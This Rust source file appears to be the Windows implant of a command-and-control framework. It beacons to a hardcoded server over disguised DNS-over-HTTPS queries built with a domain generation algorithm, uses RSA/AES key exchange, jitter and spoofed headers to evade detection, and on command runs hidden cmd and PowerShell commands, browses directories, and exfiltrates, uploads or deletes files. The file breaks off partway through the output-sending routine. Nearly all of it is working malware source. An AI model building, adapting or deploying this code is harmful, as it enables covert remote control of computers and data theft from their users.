// cargo build --target x86_64-pc-windows-gnu --release && cp target/x86_64-pc-windows-gnu/release/DOH_RSA.exe ./DOH_RSA.exe && rm -rf target Cargo.lock

use aes::Aes256;
use base64::{engine::general_purpose, Engine as _};
use cbc::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use hickory_proto::op::{Message, MessageType, OpCode, Query};
use hickory_proto::rr::{Name, RData, RecordType};
use rand::Rng;
use rand::RngCore;
use rsa::pkcs8::DecodePublicKey;
use rsa::{Oaep, RsaPublicKey};
use serde::Serialize;
use sha1::Sha1;
use sha2::{Digest as Sha2Digest, Sha256};
use sha3::{Digest as Sha3Digest, Sha3_256, Sha3_512};
use serde_json::json;
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::str::FromStr;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::time::sleep;

type Aes256CbcEnc = cbc::Encryptor<Aes256>;
type Aes256CbcDec = cbc::Decryptor<Aes256>;

const SERVER_URL: &str = "https://192.168.191.230:1111";
const ID_TOKEN: &str = "4ffeafa1-dc77-44a7-b2ab-163e3c558e4c";
const DGA_TIMER_SECS: u64 = 5 * 60;
const DOMAIN_POOL: &[&str] = &["cloudflare-dns.com"];
const DEFAULT_URIS: &[&str] = &["/support/troubleshoot"];
const DEFAULT_USER_AGENTS: &[&str] = &["Mozilla/5.0"];
const SHADOW_A_RECORD: &str = "0.0.0.0";
const PIVOT_A_RECORD: &str = "0.0.0.0";

const HARDCODED_RSA_PUBLIC_KEY: &str = "";

struct RsaCipher {
    public_key: RsaPublicKey,
}

impl RsaCipher {
    fn from_pem(pem: &str) -> Result<Self, String> {
        let public_key = RsaPublicKey::from_public_key_pem(pem)
            .map_err(|e| format!("Failed to parse RSA public key: {}", e))?;
        Ok(Self { public_key })
    }

    fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>, String> {
        let mut rng = rand::thread_rng();
        self.public_key
            .encrypt(&mut rng, Oaep::new::<Sha1>(), plaintext)
            .map_err(|e| format!("RSA encrypt error: {}", e))
    }

    fn encrypt_to_b64(&self, plaintext: &[u8]) -> Result<String, String> {
        let encrypted = self.encrypt(plaintext)?;
        Ok(general_purpose::STANDARD.encode(&encrypted))
    }
}

struct AesCipher {
    key: [u8; 32],
}

impl AesCipher {
    fn new(key: [u8; 32]) -> Self {
        Self { key }
    }

    fn encrypt(&self, plaintext: &[u8]) -> String {
        let mut iv = [0u8; 16];
        rand::thread_rng().fill_bytes(&mut iv);

        let cipher = Aes256CbcEnc::new(&self.key.into(), &iv.into());
        let ciphertext = cipher.encrypt_padded_vec_mut::<Pkcs7>(plaintext);

        let mut combined = Vec::with_capacity(16 + ciphertext.len());
        combined.extend_from_slice(&iv);
        combined.extend_from_slice(&ciphertext);

        general_purpose::URL_SAFE.encode(&combined)
    }

    fn decrypt(&self, encoded: &str) -> Result<Vec<u8>, String> {
        let trimmed = encoded.trim();

        let decoded = general_purpose::URL_SAFE
            .decode(trimmed)
            .or_else(|_| general_purpose::URL_SAFE_NO_PAD.decode(trimmed))
            .or_else(|_| general_purpose::STANDARD.decode(trimmed))
            .or_else(|_| general_purpose::STANDARD_NO_PAD.decode(trimmed))
            .map_err(|e| format!("Base64 decode error: {}", e))?;

        if decoded.len() < 16 {
            return Err("Invalid encrypted data (too short)".to_string());
        }
        if (decoded.len() - 16) % 16 != 0 {
            return Err("Invalid ciphertext length".to_string());
        }

        let iv: [u8; 16] = decoded[..16].try_into().unwrap();
        let ciphertext = &decoded[16..];

        let cipher = Aes256CbcDec::new(&self.key.into(), &iv.into());
        cipher
            .decrypt_padded_vec_mut::<Pkcs7>(ciphertext)
            .map_err(|e| format!("AES decrypt error: {:?}", e))
    }

    fn decrypt_to_string(&self, encoded: &str) -> Option<String> {
        self.decrypt(encoded)
            .ok()
            .and_then(|b| String::from_utf8(b).ok())
    }
}

#[cfg(windows)]
mod winapi {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Pipes::*;
    use windows::Win32::System::Threading::*;

    fn to_wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    pub fn run_process(full_cmd: &str) -> String {
        unsafe {
            let sa = SECURITY_ATTRIBUTES {
                nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
                lpSecurityDescriptor: std::ptr::null_mut(),
                bInheritHandle: TRUE,
            };

            let mut h_stdout_rd = HANDLE::default();
            let mut h_stdout_wr = HANDLE::default();

            if CreatePipe(&mut h_stdout_rd, &mut h_stdout_wr, Some(&sa), 0).is_err() {
                return "[-] CreatePipe failed".to_string();
            }

            let _ = SetHandleInformation(h_stdout_rd, HANDLE_FLAG_INHERIT.0, HANDLE_FLAGS(0));

            let mut si = STARTUPINFOW::default();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = h_stdout_wr;
            si.hStdError = h_stdout_wr;
            si.hStdInput = INVALID_HANDLE_VALUE;

            let mut pi = PROCESS_INFORMATION::default();

            let mut cmd_line = to_wide(full_cmd);

            let result = CreateProcessW(
                PCWSTR::null(),
                windows::core::PWSTR(cmd_line.as_mut_ptr()),
                None,
                None,
                TRUE,
                CREATE_NO_WINDOW,
                None,
                PCWSTR::null(),
                &si,
                &mut pi,
            );

            let _ = CloseHandle(h_stdout_wr);

            if result.is_err() {
                let _ = CloseHandle(h_stdout_rd);
                return "[-] CreateProcess failed".to_string();
            }

            use windows::Win32::Storage::FileSystem::ReadFile;

            let mut result_bytes: Vec<u8> = Vec::new();
            let mut buffer = [0u8; 4096];
            loop {
                let mut bytes_read: u32 = 0;
                let ok = ReadFile(
                    h_stdout_rd,
                    Some(&mut buffer),
                    Some(&mut bytes_read),
                    None,
                );
                if ok.is_err() || bytes_read == 0 {
                    break;
                }
                result_bytes.extend_from_slice(&buffer[..bytes_read as usize]);
            }

            let _ = WaitForSingleObject(pi.hProcess, INFINITE);

            let mut exit_code: u32 = 0;
            let _ = GetExitCodeProcess(pi.hProcess, &mut exit_code);

            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(h_stdout_rd);

            let output = String::from_utf8_lossy(&result_bytes).trim().to_string();
            let mut final_output = output.clone();
            if exit_code != 0 {
                final_output.push_str(&format!("\n[Exit Code: {}]", exit_code));
            }
            if final_output.is_empty() {
                return "[+] Command executed (no output)".to_string();
            }
            final_output
        }
    }
}

fn generate_dga_domain(implant_seed: &str, period: u64) -> String {
    let seed_int = u64::from_str_radix(&implant_seed[..16.min(implant_seed.len())], 16).unwrap_or(0);

    let mut seed_material = Vec::with_capacity(16);
    seed_material.extend_from_slice(&period.to_le_bytes());
    seed_material.extend_from_slice(&seed_int.to_le_bytes());

    let mut hasher = Sha3_512::new();
    Sha3Digest::update(&mut hasher, &seed_material);
    let h1 = hasher.finalize_reset();

    let mut reversed = seed_material.clone();
    reversed.reverse();
    Sha3Digest::update(&mut hasher, &h1);
    Sha3Digest::update(&mut hasher, &reversed);
    let h2 = hasher.finalize_reset();

    Sha3Digest::update(&mut hasher, &h2);
    let final_hash = hasher.finalize();

    let encoded = base32::encode(base32::Alphabet::Rfc4648 { padding: false }, &final_hash[..13]);
    let subdomain = encoded.to_lowercase();

    let suffix = DOMAIN_POOL[(period as usize) % DOMAIN_POOL.len()];
    format!("{}.{}", subdomain, suffix)
}

#[derive(Debug, Clone, Default)]
struct CommandPart {
    parts: Vec<String>,
    total: usize,
    received_count: usize,
}

#[derive(Debug, Clone, Default)]
struct ConfigPart {
    parts: Vec<String>,
    total: usize,
    received_count: usize,
}

struct DohClient {
    server_url: String,
    id_token: String,
    rsa_cipher: Option<RsaCipher>,
    aes_cipher: Option<AesCipher>,
    session_established: bool,
    user_agents: Vec<String>,
    uris: Vec<String>,
    dga_timer: u64,
    jitter_start: i64,
    jitter_end: i64,
    sleep_interval: f64,
    session_id: Option<String>,
    implant_seed: Option<String>,
    is_pivot_mode: bool,
    command_parts: HashMap<String, CommandPart>,
    config_parts: HashMap<String, ConfigPart>,
    get_client_headers: HashMap<String, String>,
    post_client_headers: HashMap<String, String>,
    prepend_output: String,
    append_output: String,
    current_checksum: Option<String>,
}

impl DohClient {
    fn new(server_url: &str, id_token: &str, dga_timer_secs: u64) -> Self {
        let rsa_cipher = if !HARDCODED_RSA_PUBLIC_KEY.is_empty() {
            RsaCipher::from_pem(HARDCODED_RSA_PUBLIC_KEY).ok()
        } else {
            None
        };

        Self {
            server_url: server_url.trim_end_matches('/').to_string(),
            id_token: id_token.trim().to_lowercase(),
            rsa_cipher,
            aes_cipher: None,
            session_established: false,
            user_agents: DEFAULT_USER_AGENTS.iter().map(|s| s.to_string()).collect(),
            uris: DEFAULT_URIS.iter().map(|s| s.to_string()).collect(),
            dga_timer: dga_timer_secs,
            jitter_start: 0,
            jitter_end: 0,
            sleep_interval: 0.0,
            session_id: None,
            implant_seed: None,
            is_pivot_mode: false,
            command_parts: HashMap::new(),
            config_parts: HashMap::new(),
            get_client_headers: HashMap::new(),
            post_client_headers: HashMap::new(),
            prepend_output: String::new(),
            append_output: String::new(),
            current_checksum: None,
        }
    }

    fn pick_random_uri(&self) -> &str {
        let idx = rand::thread_rng().gen_range(0..self.uris.len());
        &self.uris[idx]
    }

    fn pick_random_ua(&self) -> &str {
        let idx = rand::thread_rng().gen_range(0..self.user_agents.len());
        &self.user_agents[idx]
    }

    fn get_current_dga_domain(&mut self) -> String {
        if self.implant_seed.is_none() {
            let raw = format!(
                "{}{}{}",
                uuid::Uuid::new_v4(),
                SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos(),
                hex::encode(rand::thread_rng().gen::<[u8; 32]>())
            );
            let mut hasher = Sha3_256::new();
            Sha3Digest::update(&mut hasher, raw.as_bytes());
            self.implant_seed = Some(hex::encode(hasher.finalize()));
        }

        let seed = self.implant_seed.as_ref().unwrap();
        let timer = if self.dga_timer == 0 { 300 } else { self.dga_timer };
        let period = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs()
            / timer;

        generate_dga_domain(seed, period)
    }

    fn is_spoof_txt(txt: &str) -> bool {
        let lower = txt.to_lowercase();
        for prefix in &["enc:", "i=", "cb:", "cmd_info:", "cmd_complete:", "dga=", "cfg:", "rsa_"] {
            if lower.starts_with(prefix) {
                return false;
            }
        }
        if lower.starts_with("v=") || lower.starts_with("session_id:") {
            return false;
        }
        if lower.contains("azure-verification") || lower.contains("login.microsoftonline.com") {
            return true;
        }
        false
    }

    async fn fetch_server_public_key(&mut self, client: &reqwest::Client) -> bool {
        if self.rsa_cipher.is_some() {
            return true;
        }

        let current_domain = self.get_current_dga_domain();
        let query_domain = format!("{}.{}", self.id_token, current_domain);

        let mut msg = Message::new();
        msg.set_id(rand::thread_rng().gen())
            .set_message_type(MessageType::Query)
            .set_op_code(OpCode::Query)
            .set_recursion_desired(true);

        let name = match Name::from_str(&format!("{}.", query_domain)) {
            Ok(n) => n,
            Err(_) => return false,
        };
        let mut query = Query::new();
        query.set_name(name);
        query.set_query_type(RecordType::TXT);
        msg.add_query(query);

        let wire = match msg.to_vec() {
            Ok(w) => w,
            Err(_) => return false,
        };

        let enc = general_purpose::STANDARD_NO_PAD.encode(&wire);

        let uri = self.pick_random_uri().to_string();
        let url = format!("{}/{}", self.server_url, uri.trim_start_matches('/'));

        let ua = self.pick_random_ua().to_string();

        let request = client
            .get(&url)
            .query(&[("dns", &enc)])
            .header("Accept", "application/dns-message")
            .header("User-Agent", ua);

        let resp = match request.send().await {
            Ok(r) => r,
            Err(_) => return false,
        };

        if !resp.status().is_success() {
            return false;
        }

        let body = match resp.bytes().await {
            Ok(b) => b,
            Err(_) => return false,
        };

        let msg = match Message::from_vec(&body) {
            Ok(m) => m,
            Err(_) => return false,
        };

        let mut public_key_parts: Vec<String> = Vec::new();
        for record in msg.answers() {
            if let Some(RData::TXT(txt)) = record.data() {
                let txt_str = txt.to_string();
                let txt_str = txt_str.trim_matches('"');

                if txt_str.starts_with("rsa_pub_key:") {
                    public_key_parts.push(txt_str[12..].to_string());
                } else if txt_str.starts_with("rsa_key_cont:") {
                    public_key_parts.push(txt_str[13..].to_string());
                }
            }
        }

        if public_key_parts.is_empty() {
            return false;
        }

        let full_key = public_key_parts.join("");

        match RsaCipher::from_pem(&full_key) {
            Ok(cipher) => {
                self.rsa_cipher = Some(cipher);
                true
            }
            Err(_) => false,
        }
    }

    async fn establish_session(&mut self, client: &reqwest::Client) -> bool {
        let rsa = match &self.rsa_cipher {
            Some(r) => r,
            None => return false,
        };

        let mut aes_key = [0u8; 32];
        rand::thread_rng().fill_bytes(&mut aes_key);

        let encrypted_token = match rsa.encrypt_to_b64(self.id_token.as_bytes()) {
            Ok(t) => t,
            Err(_) => return false,
        };
        let encrypted_aes_key = match rsa.encrypt_to_b64(&aes_key) {
            Ok(k) => k,
            Err(_) => return false,
        };

        let uri = self.pick_random_uri().to_string();
        let url = format!("{}/{}", self.server_url, uri.trim_start_matches('/'));

        #[derive(Serialize)]
        struct CheckinPayload<'a> {
            action: &'a str,
            token: &'a str,
            aes_key: &'a str,
        }

        let payload = CheckinPayload {
            action: "checkin",
            token: &encrypted_token,
            aes_key: &encrypted_aes_key,
        };

        let ua = self.pick_random_ua().to_string();

        let request = client
            .post(&url)
            .json(&payload)
            .header("User-Agent", ua)
            .header("Content-Type", "application/json");

        let resp = match request.send().await {
            Ok(r) => r,
            Err(_) => return false,
        };

        if !resp.status().is_success() {
            return false;
        }

        let body_text = match resp.text().await {
            Ok(t) => t,
            Err(_) => return false,
        };

        #[derive(serde::Deserialize)]
        struct CheckinResponse {
            session_id: Option<String>,
            start_jitter: Option<i64>,
            end_jitter: Option<i64>,
            #[serde(rename = "Sleep")]
            sleep: Option<f64>,
            dga_timer: Option<u64>,
            shadow_ip: Option<String>,
            pivot_ip: Option<String>,
            reconnect_delay_entry: Option<f64>,
            reconnect_timeout_entry: Option<f64>,
        }

        let response: CheckinResponse = match serde_json::from_str(&body_text) {
            Ok(r) => r,
            Err(_) => return false,
        };

        if let Some(sid) = response.session_id {
            self.session_id = Some(sid);
        } else {
            return false;
        }

        if let Some(j) = response.start_jitter { self.jitter_start = j; }
        if let Some(j) = response.end_jitter { self.jitter_end = j; }
        if let Some(s) = response.sleep { self.sleep_interval = s; }
        if let Some(t) = response.dga_timer { self.dga_timer = t * 60; }

        self.aes_cipher = Some(AesCipher::new(aes_key));
        self.session_established = true;
        true
    }

    fn parse_init_payload(&mut self, txt: &str) {
        let txt: String = if txt.starts_with("ENC:") {
            let encrypted_b64 = &txt[4..];
            if let Some(ref aes) = self.aes_cipher {
                match aes.decrypt_to_string(encrypted_b64) {
                    Some(decrypted) => decrypted,
                    None => return,
                }
            } else {
                return;
            }
        } else {
            txt.to_string()
        };

        for part in txt.split('|') {
            if let Some((k, v)) = part.split_once('=') {
                let k = k.trim();
                match k {
                    "i" => self.session_id = Some(v.trim().to_string()),
                    "j" => {
                        let v = v.trim();
                        let parts: Vec<&str> = v.split('-').collect();
                        if parts.len() == 2 {
                            self.jitter_start = parts[0].trim().parse().unwrap_or(0);
                            self.jitter_end = parts[1].trim().parse().unwrap_or(0);
                        }
                    }
                    "t" => {
                        self.dga_timer = v.trim().parse::<u64>().unwrap_or(300) * 60;
                    }
                    "r" | "d" => {}
                    "s" => {}
                    "p" => {}
                    "sl" => {
                        self.sleep_interval = v.trim().parse().unwrap_or(0.0);
                    }
                    _ => {}
                }
            }
        }
    }

    fn parse_command_part(&mut self, txt: &str) -> bool {
        let txt = match txt.strip_prefix("cb:") {
            Some(t) => t,
            None => return false,
        };

        let (part_total, rest) = match txt.split_once(':') {
            Some(v) => v,
            None => return false,
        };
        let (checksum, data) = match rest.split_once(':') {
            Some(v) => v,
            None => return false,
        };

        let (part_str, total_str) = match part_total.split_once('/') {
            Some(v) => v,
            None => return false,
        };
        let part_num: usize = match part_str.parse() {
            Ok(n) => n,
            Err(_) => return false,
        };
        let total_parts: usize = match total_str.parse() {
            Ok(n) => n,
            Err(_) => return false,
        };

        if part_num == 0 || part_num > total_parts {
            return false;
        }

        let entry = self
            .command_parts
            .entry(checksum.to_string())
            .or_insert_with(|| CommandPart {
                parts: vec![String::new(); total_parts],
                total: total_parts,
                received_count: 0,
            });

        let idx = part_num - 1;
        if entry.parts[idx].is_empty() {
            entry.parts[idx] = data.to_string();
            entry.received_count += 1;
        }

        self.current_checksum = Some(checksum.to_string());
        true
    }

    fn parse_config_part(&mut self, txt: &str) -> bool {
        let txt = match txt.strip_prefix("cfg:") {
            Some(t) => t,
            None => return false,
        };

        let (part_total, rest) = match txt.split_once(':') {
            Some(v) => v,
            None => return false,
        };
        let (checksum, data) = match rest.split_once(':') {
            Some(v) => v,
            None => return false,
        };

        let (part_str, total_str) = match part_total.split_once('/') {
            Some(v) => v,
            None => return false,
        };
        let part_num: usize = match part_str.parse() {
            Ok(n) => n,
            Err(_) => return false,
        };
        let total_parts: usize = match total_str.parse() {
            Ok(n) => n,
            Err(_) => return false,
        };

        if part_num == 0 || part_num > total_parts {
            return false;
        }

        let entry = self
            .config_parts
            .entry(checksum.to_string())
            .or_insert_with(|| ConfigPart {
                parts: vec![String::new(); total_parts],
                total: total_parts,
                received_count: 0,
            });

        let idx = part_num - 1;
        if entry.parts[idx].is_empty() {
            entry.parts[idx] = data.to_string();
            entry.received_count += 1;
        }

        let is_complete = {
            let cfg_data = self.config_parts.get(checksum).unwrap();
            cfg_data.received_count == cfg_data.total
        };

        if is_complete {
            let full_encoded = {
                let cfg_data = self.config_parts.get(checksum).unwrap();
                cfg_data.parts.join("")
            };

            let decoded_bytes = general_purpose::STANDARD
                .decode(&full_encoded)
                .or_else(|_| general_purpose::STANDARD_NO_PAD.decode(&full_encoded));

            if let Ok(bytes) = decoded_bytes {
                if let Ok(full_encrypted_b64) = String::from_utf8(bytes) {
                    let mut hasher = Sha256::new();
                    Sha2Digest::update(&mut hasher, full_encrypted_b64.as_bytes());
                    let calculated = hex::encode(hasher.finalize());
                    let calculated_short = &calculated[..8];

                    if calculated_short == checksum {
                        if let Some(ref aes) = self.aes_cipher {
                            if let Some(decrypted_config) = aes.decrypt_to_string(&full_encrypted_b64) {
                                self.apply_config_payload_direct(&decrypted_config);
                            }
                        }
                    }
                }
            }
            self.config_parts.remove(checksum);
        }

        true
    }

    fn apply_config_payload_direct(&mut self, decrypted_config: &str) {
        for part in decrypted_config.split('|') {
            if let Some((k, v)) = part.split_once('=') {
                let k = k.trim();
                match k {
                    "pre" => self.prepend_output = v.trim().to_string(),
                    "app" => self.append_output = v.trim().to_string(),
                    "uas" if !v.is_empty() => {
                        self.user_agents = v.split(',')
                            .map(|s| s.trim().to_string())
                            .filter(|s| !s.is_empty())
                            .collect();
                    }
                    "uris" if !v.is_empty() => {
                        self.uris = v.split(',')
                            .map(|s| format!("/{}", s.trim().trim_start_matches('/')))
                            .filter(|s| s.len() > 1)
                            .collect();
                    }
                    "geth" if !v.is_empty() => {
                        let mut h = HashMap::new();
                        for pair in v.split(';') {
                            if let Some((hk, hv)) = pair.split_once(':') {
                                h.insert(hk.trim().to_string(), hv.trim().to_string());
                            }
                        }
                        self.get_client_headers = h;
                    }
                    "posth" if !v.is_empty() => {
                        let mut h = HashMap::new();
                        for pair in v.split(';') {
                            if let Some((hk, hv)) = pair.split_once(':') {
                                h.insert(hk.trim().to_string(), hv.trim().to_string());
                            }
                        }
                        self.post_client_headers = h;
                    }
                    "sl" => {
                        self.sleep_interval = v.trim().parse().unwrap_or(0.0);
                    }
                    _ => {}
                }
            }
        }
    }

    fn check_command_complete(&mut self, txt: &str) -> Option<String> {
        let checksum = match txt.strip_prefix("cmd_complete:") {
            Some(c) => c.trim(),
            None => return None,
        };

        let cmd_data = self.command_parts.get(checksum)?;
        if cmd_data.received_count != cmd_data.total {
            return None;
        }

        let full_encoded = cmd_data.parts.join("");

        let decoded = general_purpose::STANDARD
            .decode(&full_encoded)
            .or_else(|_| general_purpose::STANDARD_NO_PAD.decode(&full_encoded))
            .ok()?;

        let full_encrypted_b64 = String::from_utf8(decoded).ok()?;

        let mut hasher = Sha256::new();
        Sha2Digest::update(&mut hasher, full_encrypted_b64.as_bytes());
        let calculated = hex::encode(hasher.finalize());
        let calculated_short = &calculated[..8];

        self.command_parts.remove(checksum);

        if calculated_short == checksum {
            if let Some(ref aes) = self.aes_cipher {
                aes.decrypt_to_string(&full_encrypted_b64)
            } else {
                None
            }
        } else {
            None
        }
    }

    async fn apply_jitter(&self) {
        let (start, end) = if self.jitter_start > self.jitter_end {
            (self.jitter_end, self.jitter_start)
        } else {
            (self.jitter_start, self.jitter_end)
        };

        let jitter = if start == end {
            start
        } else {
            rand::thread_rng().gen_range(start..=end)
        };

        let final_sleep = self.sleep_interval + jitter as f64;
        if final_sleep > 0.0 {
            sleep(Duration::from_secs_f64(final_sleep)).await;
        }
    }

    fn expand_user(path: &str) -> String {
        if path.starts_with('~') {
            if let Some(home) = dirs::home_dir() {
                return format!("{}{}", home.display(), &path[1..]);
            }
        }
        path.to_string()
    }

    fn browse_directory(path: &str) -> String {
        let expanded = Self::expand_user(path);
        let path_ref = Path::new(&expanded);

        if !path_ref.exists() {
            return json!({
                "success": false,
                "error": format!("Path does not exist: {}", expanded),
                "current_path": expanded,
                "parent_path": null,
                "items": []
            })
            .to_string();
        }

        let mut items = Vec::new();

        if let Ok(entries) = fs::read_dir(&expanded) {
            for entry in entries.flatten() {
                let file_name = entry.file_name().to_string_lossy().to_string();
                let metadata = match entry.metadata() {
                    Ok(m) => m,
                    Err(_) => continue,
                };

                let is_dir = metadata.is_dir();
                let size = if is_dir { 0 } else { metadata.len() };
                let modified_time = metadata
                    .modified()
                    .ok()
                    .map(|t| {
                        let datetime: chrono::DateTime<chrono::Local> = t.into();
                        datetime.format("%Y-%m-%d %H:%M:%S").to_string()
                    })
                    .unwrap_or_default();

                items.push(json!({
                    "name": file_name,
                    "type": if is_dir { "directory" } else { "file" },
                    "size": size,
                    "modified_time": modified_time
                }));
            }
        }

        items.sort_by(|a, b| {
            let a_dir = a["type"] == "directory";
            let b_dir = b["type"] == "directory";
            if a_dir != b_dir {
                return b_dir.cmp(&a_dir);
            }
            a["name"]
                .as_str()
                .unwrap_or("")
                .to_lowercase()
                .cmp(&b["name"].as_str().unwrap_or("").to_lowercase())
        });

        let parent = Path::new(&expanded)
            .parent()
            .map(|p| p.display().to_string())
            .filter(|p| !p.is_empty() && p != &expanded);

        json!({
            "success": true,
            "current_path": expanded,
            "parent_path": parent,
            "items": items
        })
        .to_string()
    }

    fn download_file(filepath: &str) -> String {
        if !Path::new(filepath).exists() {
            return format!("ERROR: File not found: {}", filepath);
        }

        match fs::read(filepath) {
            Ok(data) => {
                let filename = Path::new(filepath)
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();
                let b64 = general_purpose::STANDARD.encode(&data);
                format!("file-data:{}|{}|{}", filename, data.len(), b64)
            }
            Err(e) => format!("ERROR: {}", e),
        }
    }

    fn upload_file(filepath: &str, filedata_b64: &str) -> String {
        match general_purpose::STANDARD.decode(filedata_b64) {
            Ok(data) => {
                if let Some(parent) = Path::new(filepath).parent() {
                    if !parent.exists() {
                        let _ = fs::create_dir_all(parent);
                    }
                }
                match fs::write(filepath, &data) {
                    Ok(_) => format!("SUCCESS: File uploaded to {}", filepath),
                    Err(e) => format!("ERROR: {}", e),
                }
            }
            Err(e) => format!("ERROR: {}", e),
        }
    }

    fn delete_file(filepath: &str) -> String {
        let result = if Path::new(filepath).is_dir() {
            fs::remove_dir_all(filepath)
        } else {
            fs::remove_file(filepath)
        };

        match result {
            Ok(_) => format!("SUCCESS: Deleted {}", filepath),
            Err(e) => format!("ERROR: {}", e),
        }
    }

    fn rename_file(old_path: &str, new_path: &str) -> String {
        match fs::rename(old_path, new_path) {
            Ok(_) => format!("SUCCESS: Renamed to {}", new_path),
            Err(e) => format!("ERROR: {}", e),
        }
    }

    fn run_cmd_command(cmd: &str) -> String {
        #[cfg(windows)]
        {
            let full_cmd = format!("cmd.exe /c {}", cmd);
            return winapi::run_process(&full_cmd);
        }

        #[cfg(not(windows))]
        {
            use std::process::Command;
            let output = Command::new("sh").arg("-c").arg(cmd).output();
            match output {
                Ok(out) => {
                    let mut result = String::from_utf8_lossy(&out.stdout).to_string();
                    result.push_str(&String::from_utf8_lossy(&out.stderr));
                    if !out.status.success() {
                        result.push_str(&format!(
                            "\n[Exit Code: {}]",
                            out.status.code().unwrap_or(-1)
                        ));
                    }
                    if result.trim().is_empty() {
                        "[+] Command executed (no output)".to_string()
                    } else {
                        result.trim().to_string()
                    }
                }
                Err(e) => format!("[-] CMD execution error: {}", e),
            }
        }
    }

    fn run_powershell_command(ps_cmd: &str) -> String {
        #[cfg(windows)]
        {
            let escaped = ps_cmd.replace('"', "\\\"");
            let full_cmd = format!(
                "powershell.exe -NoProfile -NonInteractive -Command {}",
                escaped
            );
            return winapi::run_process(&full_cmd);
        }

        #[cfg(not(windows))]
        {
            let _ = ps_cmd;
            "[-] PowerShell only available on Windows".to_string()
        }
    }

    fn execute_command(command: &str) -> String {
        let command = command.trim();
        if command.is_empty() {
            return "[no command received]".to_string();
        }

        let command = if command.starts_with('$') {
            match command.split_once(' ') {
                Some((_token, rest)) => rest.trim(),
                None => command,
            }
        } else {
            command
        };

        if command.is_empty() {
            return "[no command received]".to_string();
        }

        if command == "ping" {
            return "pong".to_string();
        }

        if let Some(path) = command.strip_prefix("browse:") {
            let browse_path = if path.trim().is_empty() {
                std::env::current_dir()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| ".".to_string())
            } else {
                path.trim().to_string()
            };
            let data = Self::browse_directory(&browse_path);
            let b64 = general_purpose::STANDARD.encode(data.as_bytes());
            return format!("browse-data-{}", b64);
        }

        if let Some(filepath) = command.strip_prefix("download-file:") {
            return Self::download_file(filepath.trim());
        }

        if let Some(rest) = command.strip_prefix("upload-file:") {
            if let Some((filepath, filedata)) = rest.split_once('|') {
                return Self::upload_file(filepath, filedata);
            }
            return "ERROR: Invalid upload format".to_string();
        }

        if let Some(filepath) = command.strip_prefix("delete-file:") {
            return Self::delete_file(filepath.trim());
        }

        if let Some(rest) = command.strip_prefix("rename-file:") {
            if let Some((old, new)) = rest.split_once('|') {
                return Self::rename_file(old, new);
            }
            return "ERROR: Invalid rename format".to_string();
        }

        let upper = command.to_uppercase();
        if upper.starts_with("EP ") {
            return Self::run_powershell_command(command[3..].trim());
        }
        if upper.starts_with("EP") {
            return Self::run_powershell_command(command[2..].trim());
        }

        Self::run_cmd_command(command)
    }

    async fn send_doh_query(&mut self, client: &reqwest::Client) -> Option<String> {
        let current_domain = self.get_current_dga_domain();
        let query_domain = format!("{}.{}", self.id_token, current_domain);

        let mut msg = Message::new();
        msg.set_id(rand::thread_rng().gen())
            .set_message_type(MessageType::Query)
            .set_op_code(OpCode::Query)
            .set_recursion_desired(true);

        let name = Name::from_str(&format!("{}.", query_domain)).ok()?;
        let mut query = Query::new();
        query.set_name(name);
        query.set_query_type(RecordType::TXT);
        msg.add_query(query);

        let wire = msg.to_vec().ok()?;
        let enc = general_purpose::STANDARD_NO_PAD.encode(&wire);

        let uri = self.pick_random_uri().to_string();
        let url = format!("{}/{}", self.server_url, uri.trim_start_matches('/'));

        let ua = self.pick_random_ua().to_string();

        let mut request = client
            .get(&url)
            .query(&[("dns", &enc)])
            .header("Accept", "application/dns-message")
            .header("User-Agent", ua);

        if let Some(sid) = &self.session_id {
            request = request.query(&[("session_id", sid)]);
        }

        for (k, v) in &self.get_client_headers {
            request = request.header(k, v);
        }

        let resp = match request.send().await {
            Ok(r) => r,
            Err(_) => return None,
        };

        if !resp.status().is_success() {
            return None;
        }

        let body = match resp.bytes().await {
            Ok(b) => b,
            Err(_) => return None,
        };

        let msg = match Message::from_vec(&body) {
            Ok(m) => m,
            Err(_) => return None,
        };

        let mut completed_command = None;
        let mut found_a_record = false;

        for record in msg.answers() {
            match record.data() {
                Some(RData::A(addr)) => {
                    found_a_record = true;
                    let ip = addr.to_string();
                    if ip == PIVOT_A_RECORD {
                        self.is_pivot_mode = true;
                    } else if ip == SHADOW_A_RECORD {
                        self.is_pivot_mode = false;
                    }
                }
                Some(RData::TXT(txt)) => {
                    let txt_str = txt.to_string();
                    let txt_str = txt_str.trim_matches('"');

                    if Self::is_spoof_txt(txt_str) {
                        continue;
                    }

                    if txt_str.starts_with("ENC:") || txt_str.starts_with("i=") {
                        self.parse_init_payload(txt_str);
                    } else if txt_str.starts_with("dga=") {
                        let parts: Vec<&str> = txt_str[4..].split('|').collect();
                        if parts.len() > 1 && parts[1].starts_with("seed=") {
                            self.implant_seed = Some(parts[1][5..].to_string());
                        }
                    } else if txt_str.starts_with("cb:") {
                        self.parse_command_part(txt_str);
                    } else if txt_str.starts_with("cfg:") {
                        self.parse_config_part(txt_str);
                    } else if txt_str.starts_with("cmd_info:") {
                    } else if txt_str.starts_with("cmd_complete:") {
                        if let Some(cmd) = self.check_command_complete(txt_str) {
                            completed_command = Some(cmd);
                        }
                    }
                }
                _ => {}
            }
        }

        if !found_a_record {
            self.is_pivot_mode = false;
        }

        completed_command
    }

    async fn send_output(&self, client: &reqwest::Client, output: &str) -> bool {
        let session_id = match &self.session_id {
            Some(s) => s.clone(),
            None => return false,
        };

        let aes = match &self.aes_cipher {
            Some(a) => a,
            None => return false,
        };

        let encrypted_output = aes.encrypt(output.as_bytes());

        let final_output = format!(
